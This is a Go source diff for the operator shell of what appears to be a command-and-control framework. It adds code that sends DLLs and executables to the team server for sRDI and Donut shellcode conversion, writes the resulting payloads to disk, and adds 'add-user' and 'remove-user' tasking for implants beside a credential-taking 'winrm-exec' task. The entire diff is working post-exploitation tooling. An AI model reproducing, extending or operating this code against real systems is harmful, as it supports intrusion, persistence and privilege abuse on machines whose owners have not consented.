@@ -13,6 +13,7 @@ import (
 	"net/http"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -401,6 +402,34 @@ func PrepareTaskSimple(c *ishell.Context, clientId string, command string) bool 
 	return true
 }
 
+func ParseRawTextCmdDoubleQuote(rawString string) []string {
+	inQuote := false
+	args := make([]string, 0)
+	tmpStr := ""
+	for c := range rawString {
+		if rawString[c] == ' ' {
+			if inQuote {
+				tmpStr += string(rawString[c])
+				continue
+			}
+			args = append(args, tmpStr)
+			tmpStr = ""
+			continue
+		}
+		if rawString[c] == '"' {
+			if inQuote {
+				inQuote = false
+				continue
+			}
+			inQuote = true
+			continue
+		}
+		tmpStr += string(rawString[c])
+	}
+	args = append(args, tmpStr)
+	return args
+}
+
 func ParseRawTextCmd(rawString string) []string {
 	inQuote := false
 	args := make([]string, 0)
@@ -432,29 +461,117 @@ func ParseRawTextCmd(rawString string) []string {
 func PrepareSRDI(c *ishell.Context) bool {
 	c.Printf("<dllPath> <functionToCall>: ")
 	args := c.ReadLine()
-	argz := strings.Split(args, " ")
+	argz := ParseRawTextCmd(args)
 	if len(args) < 2 {
 		return false
 	}
 	path := argz[0]
 	function := argz[1]
-	result, err := sRDIGenerate(path, function)
+	raw, err := ioutil.ReadFile(path)
 	if err != nil {
 		c.Printf(err.Error())
 		return false
 	}
-	c.Printf(result)
+	// POST BYTES
+	payload := data.SRDIPayload{
+		RawDllBytes:     raw,
+		DllFunctionName: function,
+		ConvertedDll:    nil,
+	}
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	endpoint := fmt.Sprintf("https://%s:%s/v1/srdi", ServerHostName, ServerRestPort)
+	body, err := DoPostRequest(endpoint, jsonData)
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	c.Println(string(body))
+	convertedPayload := data.SRDIPayload{
+		ConvertedDll: nil,
+	}
+	err = json.Unmarshal(body, &convertedPayload)
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	file, err := ioutil.TempFile(".", "*.srdiPayload.bin")
+	defer file.Close()
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	wrote, err := file.Write(convertedPayload.ConvertedDll)
+	if err != nil {
+		c.Printf("%s%s", err.Error())
+		return false
+	}
+	//file.Close()
+	fmt.Printf("Wrote payload to disk %s %d bytes", file.Name(), wrote)
+	return true
+}
+
+func PrepareDonut2(c *ishell.Context) bool {
+	c.Printf("<pePath> <\"donut args string\">: ")
+	args := c.ReadLine()
+	argz := ParseRawTextCmdDoubleQuote(args)
+	if len(args) < 2 {
+		return false
+	}
+	path := argz[0]
+	donutString := argz[1]
+	raw, err := ioutil.ReadFile(path)
+	if err != nil {
+		c.Printf(err.Error())
+		return false
+	}
+	fileType := filepath.Ext(path)
+	// POST BYTES
+	payload := data.DonutPayload{
+		RawPEBytes:  raw,
+		DonutString: donutString,
+		ConvertedPE: nil,
+		FileType:    fileType,
+	}
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	endpoint := fmt.Sprintf("https://%s:%s/v1/donut", ServerHostName, ServerRestPort)
+	body, err := DoPostRequest(endpoint, jsonData)
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	convertedPayload := data.DonutPayload{
+		ConvertedPE: nil,
+	}
+	err = json.Unmarshal(body, &convertedPayload)
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	file, err := ioutil.TempFile(".", "*.donut.bin")
+	defer file.Close()
+	if err != nil {
+		c.Printf("%s", err.Error())
+		return false
+	}
+	wrote, err := file.Write(convertedPayload.ConvertedPE)
+	if err != nil {
+		c.Printf("%s%s", err.Error())
+		return false
+	}
+	fmt.Printf("Wrote payload to disk %s %d bytes", file.Name(), wrote)
 	return true
 }
 
 func PrepareDonut(c *ishell.Context) bool {
 	c.Printf("DonutCmdLine: ")
-	args := c.ReadLine()
-	err := ConvertAssemblyFromFile(args, c)
-	if err != nil {
-		c.Printf(err.Error())
-		return false
-	}
 	c.Printf("[+] Donut Ready")
 	return true
 }
@@ -691,6 +808,10 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskSimple(c, clientId, command)
 	case "winrm-exec":
 		PrepareTaskWithArgs(c, clientId, command, "<Domain> <Username> <Password> <Host> <Port> <Command> <SSL 1,0 >: ")
+	case "add-user":
+		PrepareTaskWithArgs(c, clientId, command, "<user> <group>: ")
+	case "remove-user":
+		PrepareTaskWithArgs(c, clientId, command, "<user> <group>: ")
 	default:
 		c.Println("Task not found.")
 	}
@@ -768,6 +889,9 @@ func DoPostRequest(endpoint string, payload []byte) ([]byte, error) {
 	}
 	defer resp.Body.Close()
 	body, err := ioutil.ReadAll(resp.Body)
+	if resp.StatusCode > 202 {
+		return nil, fmt.Errorf("ERROR Status Code %d %s", resp.StatusCode, string(body))
+	}
 	if err != nil {
 		return nil, err
 	}
@@ -837,10 +961,10 @@ func OperatorMainLoop() {
 		Name: "donut",
 		Help: "generate donut shellcode",
 		Func: func(c *ishell.Context) {
-			c.Println("Example ->  go-donut -h")
-			c.Println("Example ->  go-donut -c ExampleClass -m ExampleMethod -p 'method parameters' -a x64 -o C:\\Tmp\\out.dll.bin -i C:\\Payload.exe")
-			c.Println("Example ->  go-donut -f 1 -i C:\\Users\\Operator\\MessageBoxSharp.exe -o C:\\Tmp\\out.bin")
-			PrepareDonut(c)
+			c.Println(`Example ->  c:\\\\tmp\\payload.exe "-h"`)
+			c.Println(`Example ->  c:\\\\tmp\\payload.exe "-c ExampleClass -m ExampleMethod -p 'method parameters' -a x64 -o C:\\Tmp\\out.dll.bin -i C:\\Payload.exe" `)
+			c.Println(`Example ->  c:\\\\tmp\\payload.exe "-f 1 -i C:\\Users\\Operator\\MessageBoxSharp.exe -o C:\\Tmp\\out.bin"`)
+			PrepareDonut2(c)
 		},
 	})
 	shell.AddCmd(&ishell.Cmd{
